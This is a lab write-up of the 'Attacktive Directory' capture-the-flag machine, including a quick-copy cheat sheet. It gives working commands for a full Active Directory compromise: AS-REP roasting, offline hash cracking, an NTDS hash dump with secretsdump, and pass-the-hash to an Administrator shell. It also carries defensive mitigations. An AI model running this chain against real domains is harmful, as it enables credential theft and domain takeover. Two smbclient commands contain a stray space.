# Attacktive Directory — Complete Walkthrough

> **Difficulty:** Medium — Active Directory (Kerberos / SMB / DRSUAPI)  
> **Goal:** Achieve full domain compromise and obtain Domain Administrator access on the *Attacktive Directory* machine.

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites & Tools](#prerequisites--tools)
3. [High-level Attack Flow](#high-level-attack-flow)
4. [Step-by-step Walkthrough](#step-by-step-walkthrough)
    * [1. Recon — Port & Service Discovery](#1-recon---port--service-discovery)
    * [2. User & Domain Enumeration](#2-user--domain-enumeration)
    * [3. AS-REP Roasting (GetNPUsers)](#3-as-rep-roasting-getnpusers)
    * [4. Cracking the AS-REP Hash](#4-cracking-the-as-rep-hash)
    * [5. Access SMB Shares with Cracked Credentials](#5-access-smb-shares-with-cracked-credentials)
    * [6. Extract NTDS via Backup/DRSUAPI](#6-extract-ntds-via-backupdrsuapi)
    * [7. Pass-the-Hash & Admin Shell](#7-pass-the-hash--admin-shell)
5. [Post-Exploitation & Evidence Collection](#post-exploitation--evidence-collection)
6. [Defense Notes & Mitigations](#defense-notes--mitigations)
7. [Cheat Sheet — Commands](#cheat-sheet---commands)
8. [Acknowledgements / References](#acknowledgements--references)

---

## Overview

This walkthrough consolidates multiple community write-ups into a single, clear, and polished guide. We exploit common AD misconfigurations: discover roastable Kerberos accounts (AS-REP), crack the resulting hash to obtain credentials, use those credentials to access SMB shares (often a `backup` or similar), leverage Backup Operator-like privileges or stored backups to extract `NTDS.dit` (via DRSUAPI/secretsdump), then authenticate as Domain Administrator using Pass-the-Hash.

---

## Prerequisites & Tools

* Linux attacker box (Kali / Parrot / Ubuntu)
* Tools installed:
  * `nmap`
  * `enum4linux` (or `smbclient`, `smbmap`)
  * Impacket tools (`GetNPUsers.py`, `secretsdump.py`)
  * `kerbrute` (optional, for username enumeration)
  * `john` or `hashcat` for cracking hashes
  * `evil-winrm` (for PTH interactive shell) or `pth-toolkit` equivalents
  * `rpcclient`, `smbclient`, `impacket` dependencies
* Wordlists: `rockyou.txt` (or other curated lists)
* Target IP (replace `<TARGET>` in commands)

---

## High-level Attack Flow

1. Discover services and confirm target is a Domain Controller (Kerberos, LDAP, SMB).
2. Enumerate domain name and usernames.
3. AS-REP roast accounts that have `Do not require Kerberos preauthentication` set.
4. Crack the AS-REP hash for plaintext password.
5. Use recovered credentials to access SMB shares and search for backup artifacts or credentials.
6. If privileged (Backup Operators / similar), use DRSUAPI (`secretsdump.py`) or other methods to dump `NTDS.dit` and extract NTLM hashes.
7. Use Administrator NTLM with Pass-the-Hash to get an interactive Administrator shell.

---

## Step-by-step Walkthrough

### 1. Recon — Port & Service Discovery

Identify open services to confirm Active Directory targets.

```bash
# Full service scan (adjust port range as needed)
nmap -sV -p 1-10000 -oA attacktive_scans <TARGET>
```

Look for:

* Kerberos: `88/tcp`
* LDAP: `389/tcp`, `636/tcp`
* SMB: `139/tcp`, `445/tcp`
* RPC / MS-SQL / other windows services

Use `enum4linux` to collect NetBIOS/SMB info and domain hints:

```bash
enum4linux -a <TARGET> > enum4linux.out
```

**Why:** Confirming AD services and discovering the domain name (e.g., `ATTACKTIVE.LOCAL`) and available shares is the foundation for subsequent AD-specific attacks.

---

### 2. User & Domain Enumeration

Collect target domain name and a list of likely usernames.

Options:

* `enum4linux` output (users/groups)
* `smbclient -L` to list shares:

```bash
smbclient -L //<TARGET> -N
```

* Username brute / enumeration via `kerbrute` (or `rpcclient`/`ldapsearch` if anonymous bind allowed).

```bash
# Example: kerbrute (replace args per binary)
kerbrute userenum -d <DOMAIN> users.txt
```

**Why:** To build a candidate userlist for AS-REP roasting and to locate service/backup-related accounts.

---

### 3. AS-REP Roasting (GetNPUsers)

Accounts with “Do not require Kerberos preauthentication” will return an encrypted blob when you request a TGT; this blob can be cracked offline.

Use Impacket’s GetNPUsers:

```bash
# Format hashcat-ready output
python3 /usr/share/doc/impacket/examples/GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat > asrep.hashes
```

If an account is AS-REP roastable, `GetNPUsers.py` returns an `etype=23` hash.

**Why:** AS-REP roasting provides password material without valid credentials — very valuable.

---

### 4. Cracking the AS-REP Hash

Crack the retrieved hash offline:

```bash
# Hashcat example (adjust hash mode; etype23 is 18200)
hashcat -m 18200 asrep.hashes /path/to/wordlist.txt
# OR John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes
```

When cracked, you obtain a username + plaintext password (e.g., `svc-backup:Summer2023!`).

**Tip:** If standard wordlists fail, try rule-based transforms or targeted wordlists (company names, years, common patterns).

---

### 5. Access SMB Shares with Cracked Credentials

Use the recovered credentials to enumerate and access SMB shares.

```bash
# List shares
smbclient -L //<TARGET> -U 'DOMAIN\\svc-backup'
# Connect to a share (e.g., backup)
smbclient // <TARGET>/backup -U 'DOMAIN\\svc-backup'
```

Download likely files (backups, `.bkf`, `.tar`, config files). Inspect files — sometimes credentials are base64-encoded, plaintext, or stored in backups. Example decode:

```bash
base64 -d file.b64 > file.decoded
strings file.decoded | less
```

**Why:** Backup shares often contain useful artifacts and sometimes direct credentials or password files used by backup jobs.

---

### 6. Extract NTDS via Backup/DRSUAPI

If the account has backup privileges or you locate a backup file with `NTDS.dit` or SYSTEM hive, use Impacket `secretsdump.py` to extract NT hashes. There are two common approaches:

**A. Using backup account credentials (SMB/DRSUAPI):**

```bash
# DRSUAPI secretsdump (just-dc to target DC)
python3 /usr/share/doc/impacket/examples/secretsdump.py 'DOMAIN/svc-backup:Password'@<TARGET> -just-dc
```

**B. If you found `NTDS.dit` + SYSTEM from a backup:**

* Download both files
* Use `impacket-secretsdump` local method or `ntdsutil` parsing tools to extract hashes.

The output will include NTLM hashes for domain users including Administrator.

**Why:** `NTDS.dit` contains the domain's password hashes — the final prize for full compromise.

---

### 7. Pass-the-Hash & Admin Shell

Use the obtained Administrator NTLM hash to authenticate without needing the plaintext password.

```bash
# Evil-WinRM PTH
evil-winrm -i <TARGET> -u Administrator -H <ADMIN_NTLM_HASH>
```

If successful, you get an interactive Administrator shell. Grab `root.txt`/`user.txt` or other proof files.

**Alternative:** Use `pth-smbclient`, `smbexec`, or `psexec` style tools that accept NTLM hashes.

---

## Post-Exploitation & Evidence Collection

* Collect `C:\Users\Administrator\Desktop\` or `C:\Users\<user>\Desktop\` flags.
* Dump local SAM, registry, and service configs if needed.
* Check `Group Policy` and `Scheduled Tasks` for persistence.
* Capture screenshots and saved evidence (timestamps, command history) for reporting.

---

## Defense Notes & Mitigations

* **Disable “Do not require Kerberos preauthentication”** for all accounts unless absolutely necessary. Audit for this setting regularly.
* **Least privilege:** Do not give broad backup rights to low-trust service accounts. Use dedicated service accounts with narrowly-scoped permissions.
* **Monitor for `GetNPUsers` / Kerberos anomalies** and repeated TGS/TGT requests. Alert on unusual AS-REP behavior.
* **Protect backups:** Ensure backups (and their copies) are stored encrypted, access-controlled, and audited.
* **Use strong password policies** and multifactor auth for privileged accounts; rotation and complexity reduce offline cracking success.

---

## Cheat Sheet — Commands (Quick Copy)

```bash
# Recon
nmap -sV -p1-10000 -oA attacktive <TARGET>
enum4linux -a <TARGET>

# Username enumeration (example)
kerbrute userenum -d <DOMAIN> users.txt

# AS-REP roasting
python3 GetNPUsers.py <DOMAIN>/ -usersfile users.txt -format hashcat > asrep.hashes

# Cracking
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
# or
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes

# SMB access
smbclient -L //<TARGET> -U 'DOMAIN\\svc-backup'
smbclient // <TARGET>/backup -U 'DOMAIN\\svc-backup'

# DRSUAPI/NTDS dump
python3 secretsdump.py 'DOMAIN/svc-backup:Password'@<TARGET> -just-dc

# Pass-the-Hash (evil-winrm)
evil-winrm -i <TARGET> -u Administrator -H <ADMIN_NTLM_HASH>
```

---


